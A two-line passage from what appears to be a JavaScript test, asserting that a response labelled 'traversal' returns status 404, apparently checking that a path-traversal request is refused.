  expect(traversal.status).toBe(404);
});
